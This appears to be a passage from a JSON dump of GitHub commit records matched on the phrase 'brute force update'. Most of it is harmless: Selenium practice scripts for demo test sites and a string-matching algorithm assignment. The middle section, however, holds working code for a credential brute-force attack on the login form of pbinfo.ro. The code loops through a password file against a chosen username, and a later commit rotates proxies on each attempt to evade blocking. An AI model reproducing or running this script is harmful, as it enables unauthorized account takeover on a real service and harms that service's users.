chrome.find_element(By.PARTIAL_LINK_TEXT,\"Geo\").click() time.sleep(2) chrome.find_element(By.TAG_NAME,\"button\").click() chrome.back() time.sleep(2) chrome.find_element(By.PARTIAL_LINK_TEXT,\"Form\").click() time.sleep(2) chrome.find_element(By.NAME,\"username\").send_keys(\"maxim\") chrome.find_element(By.NAME,\"password\").send_keys(\"razvan\") time.sleep(2) chrome.find_element(By.CLASS_NAME,\"radius\").click() chrome.get(\"https:\/\/formy-project.herokuapp.com\/\") time.sleep(2) chrome.find_element(By.LINK_TEXT,\"Key and Mouse Press\").click() time.sleep(2) chrome.find_element(By.TAG_NAME,\"input\").send_keys(\"THE END!\") time.sleep(3) ","sourceWithComments":"import time\n\nimport action as action\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\nchrome = webdriver.Chrome()\nchrome.maximize_window()\ntime.sleep(2)\nchrome.get(\"https:\/\/formy-project.herokuapp.com\/\")\ntime.sleep(2)\nchrome.find_element(By.LINK_TEXT, \"Enabled and disabled elements\").click()\ntime.sleep(2)\nchrome.find_element(By.ID,\"input\").send_keys(\"calculator\")\ntime.sleep(2)\nchrome.find_element(By.CLASS_NAME,\"navbar-brand\").click()\ntime.sleep(2)\nchrome.find_element(By.LINK_TEXT,\"Checkbox\").click()\ntime.sleep(1)\nchrome.find_element(By.ID,\"checkbox-2\").click()\ntime.sleep(2)\nchrome.back()\nchrome.find_element(By.LINK_TEXT,\"Autocomplete\").click()\ntime.sleep(2)\nchrome.find_element(By.ID,\"autocomplete\").send_keys(\"Muntii Godeanu\")\naddress = chrome.find_elements(By.CLASS_NAME,\"form-control\")\naddress[1].send_keys(\"nr 20\")\naddress[3].send_keys(\"Chinteni\")\naddress[4].send_keys(\"Cluj\")\naddress[5].send_keys(\"407205\")\naddress[6].send_keys(\"Romania\")\ntime.sleep(3)\nchrome.back()\ntime.sleep(1)\nchrome.get(\"https:\/\/the-internet.herokuapp.com\/\")\ntime.sleep(2)\nchrome.find_element(By.LINK_TEXT,\"Dynamic Controls\").click()\nchrome.find_element(By.TAG_NAME,\"input\").click()\ntime.sleep(3)\nchrome.find_element(By.LINK_TEXT,\"Elemental Selenium\").click()\ntime.sleep(2)\nchwd = chrome.window_handles\nchrome.switch_to.window(chwd[1])\ntime.sleep(2)\nchrome.find_element(By.NAME,\"fields[programming_language]\").click()\ntime.sleep(1)\noptiuni = chrome.find_elements(By.TAG_NAME,\"option\")\noptiuni[4].click()\ntime.sleep(4)\nchrome.get(\"http:\/\/www.seleniumframework.com\/Practiceform\/\")\ntime.sleep(2)\nchrome.find_element(By.LINK_TEXT,\"Browser Commands\").click()\ntime.sleep(2)\nchrome.get(\"https:\/\/the-internet.herokuapp.com\/\")\ntime.sleep(2)\nchrome.find_element(By.LINK_TEXT,\"Challenging DOM\").click()\ntime.sleep(2)\nword = chrome.find_element(By.XPATH,\"\/\/table\/tbody\/tr[3]\/td[4]\").text\nchrome.back()\ntime.sleep(2)\nchrome.find_element(By.LINK_TEXT,\"Form Authentication\").click()\ntime.sleep(2)\nchrome.find_element(By.NAME,\"username\").send_keys(word)\ntime.sleep(3)\nchrome.back()\ntime.sleep(2)\nchrome.find_element(By.PARTIAL_LINK_TEXT,\"Chall\").click()\ntime.sleep(2)\nchrome.back()\ntime.sleep(2)\nchrome.find_element(By.PARTIAL_LINK_TEXT,\"Geo\").click()\ntime.sleep(2)\nchrome.find_element(By.TAG_NAME,\"button\").click()\nchrome.back()\ntime.sleep(2)\nchrome.find_element(By.PARTIAL_LINK_TEXT,\"Form\").click()\ntime.sleep(2)\nchrome.find_element(By.NAME,\"username\").send_keys(\"maxim\")\nchrome.find_element(By.NAME,\"password\").send_keys(\"razvan\")\ntime.sleep(2)\nchrome.find_element(By.CLASS_NAME,\"radius\").click()\nchrome.get(\"https:\/\/formy-project.herokuapp.com\/\")\ntime.sleep(2)\nchrome.find_element(By.LINK_TEXT,\"Key and Mouse Press\").click()\ntime.sleep(2)\nchrome.find_element(By.TAG_NAME,\"input\").send_keys(\"THE END!\")\ntime.sleep(3)\n\n\n\n\n"},"\/CSS_Selectors.py":{"changes":[{"diff":"\n chrome.find_element(By.CSS_SELECTOR,\"#username\").send_keys(\"tomsmith\")\n chrome.find_element(By.CSS_SELECTOR,'input[type=\"password\"]').send_keys(\"SuperSecretPassword!\")\n chrome.find_element(By.CSS_SELECTOR,'.radius').click()\n-time.sleep(3)\n","add":0,"remove":1,"filename":"\/CSS_Selectors.py","badparts":["time.sleep(3)"],"goodparts":[]}],"source":"\nimport time from selenium import webdriver from selenium.webdriver.common.by import By chrome=webdriver.Chrome() chrome.maximize_window() chrome.get(\"https:\/\/the-internet.herokuapp.com\/\") chrome.implicitly_wait(5) chrome.find_element(By.LINK_TEXT,\"Form Authentication\").click() chrome.find_element(By.CSS_SELECTOR,\" chrome.find_element(By.CSS_SELECTOR,'input[type=\"password\"]').send_keys(\"SuperSecretPassword!\") chrome.find_element(By.CSS_SELECTOR,'.radius').click() time.sleep(3) ","sourceWithComments":"import time\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\nchrome = webdriver.Chrome()\nchrome.maximize_window()\nchrome.get(\"https:\/\/the-internet.herokuapp.com\/\")\nchrome.implicitly_wait(5)\nchrome.find_element(By.LINK_TEXT,\"Form Authentication\").click()\nchrome.find_element(By.CSS_SELECTOR,\"#username\").send_keys(\"tomsmith\")\nchrome.find_element(By.CSS_SELECTOR,'input[type=\"password\"]').send_keys(\"SuperSecretPassword!\")\nchrome.find_element(By.CSS_SELECTOR,'.radius').click()\ntime.sleep(3)\n"},"\/xpath_selector.py":{"changes":[{"diff":"\n chrome.get(\"https:\/\/the-internet.herokuapp.com\/\")\n chrome.implicitly_wait(5)\n chrome.find_element(By.XPATH,\"\/\/ul\/li[6]\/a\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,\"\/\/input[1]\").click()\n chrome.find_element(By.XPATH,\"\/\/input[2]\").click()\n-time.sleep(2)\n+\n chrome.back()\n chrome.find_element(By.XPATH,\"\/\/ul\/li[15]\/a\").click()\n-time.sleep(2)\n+\n chrome.switch_to.active_element.click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/*[@id=\"restart-ad\"]').click()\n-time.sleep(2)\n+\n chrome.switch_to.active_element.click()\n chrome.back()\n-time.sleep(2)\n+\n chrome.get(\"https:\/\/www.flashscore.ro\/\")\n chrome.find_element(By.XPATH,'\/\/*[@id=\"my-leagues-list\"]\/div[1]\/div[1]\/a\/span[2]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@class=\"tabs__group\"]\/a[text()=\"Rezultate\"]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@class=\"menuTop__items\"]\/a[1]\/div[text()=\"Fotbal\"]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@class=\"calendar__datepicker \"]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@class=\"calendar__days\"]\/div[text()=\"10\/12 S\u00e2\"]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@class=\"event__header top\"]\/div[2]\/div[1]\/span[text()=\"Cupa Mondial\u0103 - Play-off\"]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@id=\"g_1_2g49AZK4\"]\/div[2]').click()\n-time.sleep(2)\n+\n chwd = chrome.window_handles\n chrome.switch_to.window(chwd[1])\n chrome.maximize_window()\n","add":13,"remove":13,"filename":"\/xpath_selector.py","badparts":["time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)"],"goodparts":[]}],"source":"\nimport time from selenium import webdriver from selenium.webdriver.common.by import By chrome=webdriver.Chrome() chrome.maximize_window() chrome.get(\"https:\/\/the-internet.herokuapp.com\/\") chrome.implicitly_wait(5) chrome.find_element(By.XPATH,\"\/\/ul\/li[6]\/a\").click() time.sleep(2) chrome.find_element(By.XPATH,\"\/\/input[1]\").click() chrome.find_element(By.XPATH,\"\/\/input[2]\").click() time.sleep(2) chrome.back() chrome.find_element(By.XPATH,\"\/\/ul\/li[15]\/a\").click() time.sleep(2) chrome.switch_to.active_element.click() time.sleep(2) chrome.find_element(By.XPATH,'\/\/*[@id=\"restart-ad\"]').click() time.sleep(2) chrome.switch_to.active_element.click() chrome.back() time.sleep(2) chrome.get(\"https:\/\/www.flashscore.ro\/\") chrome.find_element(By.XPATH,'\/\/*[@id=\"my-leagues-list\"]\/div[1]\/div[1]\/a\/span[2]').click() time.sleep(2) chrome.find_element(By.XPATH,'\/\/div[@class=\"tabs__group\"]\/a[text()=\"Rezultate\"]').click() time.sleep(2) chrome.find_element(By.XPATH,'\/\/div[@class=\"menuTop__items\"]\/a[1]\/div[text()=\"Fotbal\"]').click() time.sleep(2) chrome.find_element(By.XPATH,'\/\/div[@class=\"calendar__datepicker \"]').click() time.sleep(2) chrome.find_element(By.XPATH,'\/\/div[@class=\"calendar__days\"]\/div[text()=\"10\/12 S\u00e2\"]').click() time.sleep(2) chrome.find_element(By.XPATH,'\/\/div[@class=\"event__header top\"]\/div[2]\/div[1]\/span[text()=\"Cupa Mondial\u0103 -Play-off\"]').click() time.sleep(2) chrome.find_element(By.XPATH,'\/\/div[@id=\"g_1_2g49AZK4\"]\/div[2]').click() time.sleep(2) chwd=chrome.window_handles chrome.switch_to.window(chwd[1]) chrome.maximize_window() scor=chrome.find_element(By.XPATH,'\/\/div[@class=\"duelParticipant\"]').text print(scor) ","sourceWithComments":"import time\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\nchrome = webdriver.Chrome()\nchrome.maximize_window()\nchrome.get(\"https:\/\/the-internet.herokuapp.com\/\")\nchrome.implicitly_wait(5)\nchrome.find_element(By.XPATH,\"\/\/ul\/li[6]\/a\").click()\ntime.sleep(2)\nchrome.find_element(By.XPATH,\"\/\/input[1]\").click()\nchrome.find_element(By.XPATH,\"\/\/input[2]\").click()\ntime.sleep(2)\nchrome.back()\nchrome.find_element(By.XPATH,\"\/\/ul\/li[15]\/a\").click()\ntime.sleep(2)\nchrome.switch_to.active_element.click()\ntime.sleep(2)\nchrome.find_element(By.XPATH,'\/\/*[@id=\"restart-ad\"]').click()\ntime.sleep(2)\nchrome.switch_to.active_element.click()\nchrome.back()\ntime.sleep(2)\nchrome.get(\"https:\/\/www.flashscore.ro\/\")\nchrome.find_element(By.XPATH,'\/\/*[@id=\"my-leagues-list\"]\/div[1]\/div[1]\/a\/span[2]').click()\ntime.sleep(2)\nchrome.find_element(By.XPATH,'\/\/div[@class=\"tabs__group\"]\/a[text()=\"Rezultate\"]').click()\ntime.sleep(2)\nchrome.find_element(By.XPATH,'\/\/div[@class=\"menuTop__items\"]\/a[1]\/div[text()=\"Fotbal\"]').click()\ntime.sleep(2)\nchrome.find_element(By.XPATH,'\/\/div[@class=\"calendar__datepicker \"]').click()\ntime.sleep(2)\nchrome.find_element(By.XPATH,'\/\/div[@class=\"calendar__days\"]\/div[text()=\"10\/12 S\u00e2\"]').click()\ntime.sleep(2)\nchrome.find_element(By.XPATH,'\/\/div[@class=\"event__header top\"]\/div[2]\/div[1]\/span[text()=\"Cupa Mondial\u0103 - Play-off\"]').click()\ntime.sleep(2)\nchrome.find_element(By.XPATH,'\/\/div[@id=\"g_1_2g49AZK4\"]\/div[2]').click()\ntime.sleep(2)\nchwd = chrome.window_handles\nchrome.switch_to.window(chwd[1])\nchrome.maximize_window()\nscor = chrome.find_element(By.XPATH,'\/\/div[@class=\"duelParticipant\"]').text\nprint(scor)\n\n\n\n\n\n\n\n\n\n\n\n"}},"msg":"brute force update"}},"https:\/\/github.com\/AlbinoFan34\/pbinfo-brute-force-":{"2993378fdc76575188fa4a8a1b7014300fb2df7a":{"url":"https:\/\/api.github.com\/repos\/AlbinoFan34\/pbinfo-brute-force-\/commits\/2993378fdc76575188fa4a8a1b7014300fb2df7a","html_url":"https:\/\/github.com\/AlbinoFan34\/pbinfo-brute-force-\/commit\/2993378fdc76575188fa4a8a1b7014300fb2df7a","sha":"2993378fdc76575188fa4a8a1b7014300fb2df7a","keyword":"brute force update","diff":"diff --git a\/pbinfo-brute-force.py b\/pbinfo-brute-force.py\nindex 1d73ab9..54ae447 100644\n--- a\/pbinfo-brute-force.py\n+++ b\/pbinfo-brute-force.py\n@@ -4,7 +4,7 @@\n import time\r\n \r\n \r\n-PATH = \"C:\\Program Files (x86)\\chromedriver.exe\"\r\n+PATH = \"C:\\Program Files (x86)\\chromedriver.exe\" # puneti unde este locat chromedriver.exe\r\n \r\n driver = webdriver.Chrome(PATH)\r\n username = \"pbinfouser\" # pune numele userului aici\r\n","message":"","files":{"\/pbinfo-brute-force.py":{"changes":[{"diff":"\n import time\r\n \r\n \r\n-PATH = \"C:\\Program Files (x86)\\chromedriver.exe\"\r\n+PATH = \"C:\\Program Files (x86)\\chromedriver.exe\" # puneti unde este locat chromedriver.exe\r\n \r\n driver = webdriver.Chrome(PATH)\r\n username = \"pbinfouser\" # pune numele userului aici\r\n","add":1,"remove":1,"filename":"\/pbinfo-brute-force.py","badparts":["PATH = \"C:\\Program Files (x86)\\chromedriver.exe\"\r"],"goodparts":["PATH = \"C:\\Program Files (x86)\\chromedriver.exe\" # puneti unde este locat chromedriver.exe\r"]}],"source":"\nfrom selenium import webdriver\r from selenium.webdriver.common.by import By\r from selenium.webdriver.common.action_chains import ActionChains\r import time\r \r \r PATH=\"C:\\Program Files(x86)\\chromedriver.exe\"\r \r driver=webdriver.Chrome(PATH)\r username=\"pbinfouser\" \r passwords=open('pbinfopasswords.txt',\"r\") Lines=passwords.readlines()\r for line in Lines:\r driver.get(\"https:\/\/www.pbinfo.ro\/\")\r driver.find_element(By.CSS_SELECTOR,\" time.sleep(1)\r driver.find_element(By.ID,\"user_login\").send_keys(username)\r driver.find_element(By.CSS_SELECTOR,\" driver.find_element(By.CSS_SELECTOR,\" time.sleep(4)\r \r ","sourceWithComments":"from selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.common.action_chains import ActionChains\r\nimport time\r\n\r\n\r\nPATH = \"C:\\Program Files (x86)\\chromedriver.exe\"\r\n\r\ndriver = webdriver.Chrome(PATH)\r\nusername = \"pbinfouser\" # pune numele userului aici\r\n\r\npasswords = open('pbinfopasswords.txt',\"r\") # pune\u021bi fi\u0219ierul cu parole aici \r\nLines = passwords.readlines()\r\nfor line in Lines:\r\n driver.get(\"https:\/\/www.pbinfo.ro\/\")\r\n driver.find_element(By.CSS_SELECTOR,\"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a\").click()\r\n time.sleep(1)\r\n driver.find_element(By.ID,\"user_login\").send_keys(username)\r\n driver.find_element(By.CSS_SELECTOR,\"#parola_login\").send_keys(line.strip())\r\n driver.find_element(By.CSS_SELECTOR,\"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary\").click()\r\n time.sleep(4)\r\n\r\n"}},"msg":"Update pbinfo-brute-force.py"},"748f9c17760af588b5fd2db4590b1c84eb8324ce":{"url":"https:\/\/api.github.com\/repos\/AlbinoFan34\/pbinfo-brute-force-\/commits\/748f9c17760af588b5fd2db4590b1c84eb8324ce","html_url":"https:\/\/github.com\/AlbinoFan34\/pbinfo-brute-force-\/commit\/748f9c17760af588b5fd2db4590b1c84eb8324ce","message":"Update pbinfo-brute-force.py","sha":"748f9c17760af588b5fd2db4590b1c84eb8324ce","keyword":"brute force update","diff":"diff --git a\/pbinfo-brute-force.py b\/pbinfo-brute-force.py\nindex 54ae447..5e7052c 100644\n--- a\/pbinfo-brute-force.py\n+++ b\/pbinfo-brute-force.py\n@@ -4,19 +4,30 @@\n import time\r\n \r\n \r\n-PATH = \"C:\\Program Files (x86)\\chromedriver.exe\" # puneti unde este locat chromedriver.exe\r\n+PATH = \"C:\\Program Files (x86)\\chromedriver.exe\" # \r\n \r\n driver = webdriver.Chrome(PATH)\r\n username = \"pbinfouser\" # pune numele userului aici\r\n \r\n-passwords = open('pbinfopasswords.txt',\"r\") # pune\u021bi fi\u0219ierul cu parole aici \r\n-Lines = passwords.readlines()\r\n-for line in Lines:\r\n- driver.get(\"https:\/\/www.pbinfo.ro\/\")\r\n- driver.find_element(By.CSS_SELECTOR,\"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a\").click()\r\n- time.sleep(1)\r\n- driver.find_element(By.ID,\"user_login\").send_keys(username)\r\n- driver.find_element(By.CSS_SELECTOR,\"#parola_login\").send_keys(line.strip())\r\n- driver.find_element(By.CSS_SELECTOR,\"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary\").click()\r\n- time.sleep(4)\r\n+\r\n+with open(\"pbinfopasswords.txt\") as pbinfopasswords, open(\"proxies.txt\") as proxyLines: # puneti fisierul cu proxies in proxies.txt, puneti fisierul  cu parole in pbinfopasswords.txt;\r\n+ for line , proxyline in zip(pbinfopasswords, proxyLines):\r\n+  line  = line.strip()\r\n+  proxyline = proxyline.strip()\r\n+  chrome_options = webdriver.ChromeOptions()\r\n+  ipandport = proxyline.split(\":\")\r\n+  ip = ipandport[0]\r\n+  port = ipandport[1]\r\n+  chrome_options.add_argument(f'--proxy-server={ip}:{port}')\r\n+  driver = webdriver.Chrome(PATH, options=chrome_options)\r\n+  driver.get(\"https:\/\/www.pbinfo.ro\/\")\r\n+  time.sleep(10)\r\n+  driver.find_element(By.CSS_SELECTOR,\"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a\").click()\r\n+  time.sleep(1)\r\n+  driver.find_element(By.ID,\"user_login\").send_keys(username)\r\n+  driver.find_element(By.CSS_SELECTOR,\"#parola_login\").send_keys(line.strip())\r\n+  driver.find_element(By.CSS_SELECTOR,\"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary\").click()\r\n+  time.sleep(4)\r\n+\r\n+\r\n \r\n","files":{"\/pbinfo-brute-force.py":{"changes":[{"diff":"\n import time\r\n \r\n \r\n-PATH = \"C:\\Program Files (x86)\\chromedriver.exe\" # puneti unde este locat chromedriver.exe\r\n+PATH = \"C:\\Program Files (x86)\\chromedriver.exe\" # \r\n \r\n driver = webdriver.Chrome(PATH)\r\n username = \"pbinfouser\" # pune numele userului aici\r\n \r\n-passwords = open('pbinfopasswords.txt',\"r\") # pune\u021bi fi\u0219ierul cu parole aici \r\n-Lines = passwords.readlines()\r\n-for line in Lines:\r\n- driver.get(\"https:\/\/www.pbinfo.ro\/\")\r\n- driver.find_element(By.CSS_SELECTOR,\"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a\").click()\r\n- time.sleep(1)\r\n- driver.find_element(By.ID,\"user_login\").send_keys(username)\r\n- driver.find_element(By.CSS_SELECTOR,\"#parola_login\").send_keys(line.strip())\r\n- driver.find_element(By.CSS_SELECTOR,\"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary\").click()\r\n- time.sleep(4)\r\n+\r\n+with open(\"pbinfopasswords.txt\") as pbinfopasswords, open(\"proxies.txt\") as proxyLines: # puneti fisierul cu proxies in proxies.txt, puneti fisierul  cu parole in pbinfopasswords.txt;\r\n+ for line , proxyline in zip(pbinfopasswords, proxyLines):\r\n+  line  = line.strip()\r\n+  proxyline = proxyline.strip()\r\n+  chrome_options = webdriver.ChromeOptions()\r\n+  ipandport = proxyline.split(\":\")\r\n+  ip = ipandport[0]\r\n+  port = ipandport[1]\r\n+  chrome_options.add_argument(f'--proxy-server={ip}:{port}')\r\n+  driver = webdriver.Chrome(PATH, options=chrome_options)\r\n+  driver.get(\"https:\/\/www.pbinfo.ro\/\")\r\n+  time.sleep(10)\r\n+  driver.find_element(By.CSS_SELECTOR,\"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a\").click()\r\n+  time.sleep(1)\r\n+  driver.find_element(By.ID,\"user_login\").send_keys(username)\r\n+  driver.find_element(By.CSS_SELECTOR,\"#parola_login\").send_keys(line.strip())\r\n+  driver.find_element(By.CSS_SELECTOR,\"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary\").click()\r\n+  time.sleep(4)\r\n+\r\n+\r\n \r\n","add":22,"remove":11,"filename":"\/pbinfo-brute-force.py","badparts":["PATH = \"C:\\Program Files (x86)\\chromedriver.exe\" # puneti unde este locat chromedriver.exe\r","passwords = open('pbinfopasswords.txt',\"r\") # pune\u021bi fi\u0219ierul cu parole aici \r","Lines = passwords.readlines()\r","for line in Lines:\r"," driver.get(\"https:\/\/www.pbinfo.ro\/\")\r"," driver.find_element(By.CSS_SELECTOR,\"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a\").click()\r"," time.sleep(1)\r"," driver.find_element(By.ID,\"user_login\").send_keys(username)\r"," driver.find_element(By.CSS_SELECTOR,\"#parola_login\").send_keys(line.strip())\r"," driver.find_element(By.CSS_SELECTOR,\"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary\").click()\r"," time.sleep(4)\r"],"goodparts":["PATH = \"C:\\Program Files (x86)\\chromedriver.exe\" # \r","\r","with open(\"pbinfopasswords.txt\") as pbinfopasswords, open(\"proxies.txt\") as proxyLines: # puneti fisierul cu proxies in proxies.txt, puneti fisierul  cu parole in pbinfopasswords.txt;\r"," for line , proxyline in zip(pbinfopasswords, proxyLines):\r","  line  = line.strip()\r","  proxyline = proxyline.strip()\r","  chrome_options = webdriver.ChromeOptions()\r","  ipandport = proxyline.split(\":\")\r","  ip = ipandport[0]\r","  port = ipandport[1]\r","  chrome_options.add_argument(f'--proxy-server={ip}:{port}')\r","  driver = webdriver.Chrome(PATH, options=chrome_options)\r","  driver.get(\"https:\/\/www.pbinfo.ro\/\")\r","  time.sleep(10)\r","  driver.find_element(By.CSS_SELECTOR,\"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a\").click()\r","  time.sleep(1)\r","  driver.find_element(By.ID,\"user_login\").send_keys(username)\r","  driver.find_element(By.CSS_SELECTOR,\"#parola_login\").send_keys(line.strip())\r","  driver.find_element(By.CSS_SELECTOR,\"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary\").click()\r","  time.sleep(4)\r","\r","\r"]}],"source":"\nfrom selenium import webdriver\r from selenium.webdriver.common.by import By\r from selenium.webdriver.common.action_chains import ActionChains\r import time\r \r \r PATH=\"C:\\Program Files(x86)\\chromedriver.exe\" \r driver=webdriver.Chrome(PATH)\r username=\"pbinfouser\" \r passwords=open('pbinfopasswords.txt',\"r\") Lines=passwords.readlines()\r for line in Lines:\r driver.get(\"https:\/\/www.pbinfo.ro\/\")\r driver.find_element(By.CSS_SELECTOR,\" time.sleep(1)\r driver.find_element(By.ID,\"user_login\").send_keys(username)\r driver.find_element(By.CSS_SELECTOR,\" driver.find_element(By.CSS_SELECTOR,\" time.sleep(4)\r \r ","sourceWithComments":"from selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.common.action_chains import ActionChains\r\nimport time\r\n\r\n\r\nPATH = \"C:\\Program Files (x86)\\chromedriver.exe\" # puneti unde este locat chromedriver.exe\r\n\r\ndriver = webdriver.Chrome(PATH)\r\nusername = \"pbinfouser\" # pune numele userului aici\r\n\r\npasswords = open('pbinfopasswords.txt',\"r\") # pune\u021bi fi\u0219ierul cu parole aici \r\nLines = passwords.readlines()\r\nfor line in Lines:\r\n driver.get(\"https:\/\/www.pbinfo.ro\/\")\r\n driver.find_element(By.CSS_SELECTOR,\"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a\").click()\r\n time.sleep(1)\r\n driver.find_element(By.ID,\"user_login\").send_keys(username)\r\n driver.find_element(By.CSS_SELECTOR,\"#parola_login\").send_keys(line.strip())\r\n driver.find_element(By.CSS_SELECTOR,\"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary\").click()\r\n time.sleep(4)\r\n\r\n"}},"msg":"Update pbinfo-brute-force.py"}},"https:\/\/github.com\/Atrolide\/Algorithms-Python":{"259cc3e8487b13831681da0240f321cf5471699b":{"url":"https:\/\/api.github.com\/repos\/Atrolide\/Algorithms-Python\/commits\/259cc3e8487b13831681da0240f321cf5471699b","html_url":"https:\/\/github.com\/Atrolide\/Algorithms-Python\/commit\/259cc3e8487b13831681da0240f321cf5471699b","sha":"259cc3e8487b13831681da0240f321cf5471699b","keyword":"brute force update","diff":"diff --git a\/Assignment1\/Task1\/pattern_matching\/brute_force.py b\/Assignment1\/Task1\/pattern_matching\/brute_force.py\nindex 414c41c..539502b 100644\n--- a\/Assignment1\/Task1\/pattern_matching\/brute_force.py\n+++ b\/Assignment1\/Task1\/pattern_matching\/brute_force.py\n@@ -1,11 +1,17 @@\n def brute_force_search(pattern, text):\n+    # Create an empty list to store the starting positions of the pattern in the text\n     positions = []\n+\n+    # Iterate over all possible starting positions i in the text where the length of the substring starting at i is at least as long as the pattern\n     for i in range(len(text) - len(pattern) + 1):\n+        # Initialize a counter j to 0\n         j = 0\n+        # While j is less than the length of the pattern and the character at position i + j in the text matches the character at position j in the pattern, increment j\n         while j < len(pattern) and text[i + j] == pattern[j]:\n             j += 1\n+        # If j equals the length of the pattern, the pattern has been found at position i in the text. Append i to the positions list.\n         if j == len(pattern):\n             positions.append(i)\n \n-    print('This is the Brute Force Algorithm!')\n-    return positions\n+    # Return the list of starting positions of the pattern in the text\n+    return positions\n\\ No newline at end of file\n","message":"","files":{"\/Assignment1\/Task1\/pattern_matching\/brute_force.py":{"changes":[{"diff":"\n def brute_force_search(pattern, text):\n+    # Create an empty list to store the starting positions of the pattern in the text\n     positions = []\n+\n+    # Iterate over all possible starting positions i in the text where the length of the substring starting at i is at least as long as the pattern\n     for i in range(len(text) - len(pattern) + 1):\n+        # Initialize a counter j to 0\n         j = 0\n+        # While j is less than the length of the pattern and the character at position i + j in the text matches the character at position j in the pattern, increment j\n         while j < len(pattern) and text[i + j] == pattern[j]:\n             j += 1\n+        # If j equals the length of the pattern, the pattern has been found at position i in the text. Append i to the positions list.\n         if j == len(pattern):\n             positions.append(i)\n \n-    print('This is the Brute Force Algorithm!')\n-    return positions\n+    # Return the list of starting positions of the pattern in the text\n+    return positions\n\\ No newline at end of file\n","add":8,"remove":2,"filename":"\/Assignment1\/Task1\/pattern_matching\/brute_force.py","badparts":["    print('This is the Brute Force Algorithm!')","    return positions"],"goodparts":["    return positions"]}],"source":"\ndef brute_force_search(pattern, text): positions=[] for i in range(len(text) -len(pattern) +1): j=0 while j < len(pattern) and text[i +j]==pattern[j]: j +=1 if j==len(pattern): positions.append(i) print('This is the Brute Force Algorithm!') return positions ","sourceWithComments":"def brute_force_search(pattern, text):\n    positions = []\n    for i in range(len(text) - len(pattern) + 1):\n        j = 0\n        while j < len(pattern) and text[i + j] == pattern[j]:\n            j += 1\n        if j == len(pattern):\n            positions.append(i)\n\n    print('This is the Brute Force Algorithm!')\n    return positions\n"}},"msg":"Update brute_force.py"},"16c311f82f4ba08f88ed71d1e88a6c7785be6355":{"url":"https:\/\/api.github.com\/repos\/Atrolide\/Algorithms-Python\/commits\/16c311f82f4ba08f88ed71d1e88a6c7785be6355","html_url":"https:\/\/github.com\/Atrolide\/Algorithms-Python\/commit\/16c311f82f4ba08f88ed71d1e88a6c7785be6355","message":"Update brute_force.py","sha":"16c311f82f4ba08f88ed71d1e88a6c7785be6355","keyword":"brute force update","diff":"diff --git a\/Assignment1\/Task1\/pattern_matching\/brute_force.py b\/Assignment1\/Task1\/pattern_matching\/brute_force.py\nindex 539502b..a098298 100644\n--- a\/Assignment1\/Task1\/pattern_matching\/brute_force.py\n+++ b\/Assignment1\/Task1\/pattern_matching\/brute_force.py\n@@ -1,3 +1,16 @@\n+def brute_force_search(pattern, text):\n+    positions = []\n+    for i in range(len(text)):\n+        for j in range(len(pattern)):\n+            if i + j >= len(text) or text[i + j] != pattern[j]:\n+                break\n+        else:\n+            positions.append(i)\n+    return positions\n+\n+\n+\n+'''\n def brute_force_search(pattern, text):\n     # Create an empty list to store the starting positions of the pattern in the text\n     positions = []\n@@ -14,4 +27,5 @@ def brute_force_search(pattern, text):\n             positions.append(i)\n \n     # Return the list of starting positions of the pattern in the text\n-    return positions\n\\ No newline at end of file\n+    return positions\n+'''\n\\ No newline at end of file\n","files":{"\/Assignment1\/Task1\/pattern_matching\/brute_force.py":{"changes":[{"diff":"\n             positions.append(i)\n \n     # Return the list of starting positions of the pattern in the text\n-    return positions\n\\ No newline at end of file\n+    return positions\n+'''\n\\ No newline at end of file\n","add":2,"remove":1,"filename":"\/Assignment1\/Task1\/pattern_matching\/brute_force.py","badparts":["    return positions"],"goodparts":["    return positions","'''"]}],"source":"\ndef brute_force_search(pattern, text): positions=[] for i in range(len(text) -len(pattern) +1): j=0 while j < len(pattern) and text[i +j]==pattern[j]: j +=1 if j==len(pattern): positions.append(i) return positions ","sourceWithComments":"def brute_force_search(pattern, text):\n    # Create an empty list to store the starting positions of the pattern in the text\n    positions = []\n\n    # Iterate over all possible starting positions i in the text where the length of the substring starting at i is at least as long as the pattern\n    for i in range(len(text) - len(pattern) + 1):\n        # Initialize a counter j to 0\n        j = 0\n        # While j is less than the length of the pattern and the character at position i + j in the text matches the character at position j in the pattern, increment j\n        while j < len(pattern) and text[i + j] == pattern[j]:\n            j += 1\n        # If j equals the length of the pattern, the pattern has been found at position i in the text. Append i to the positions list.\n        if j == len(pattern):\n            positions.append(i)\n\n    # Return the list of 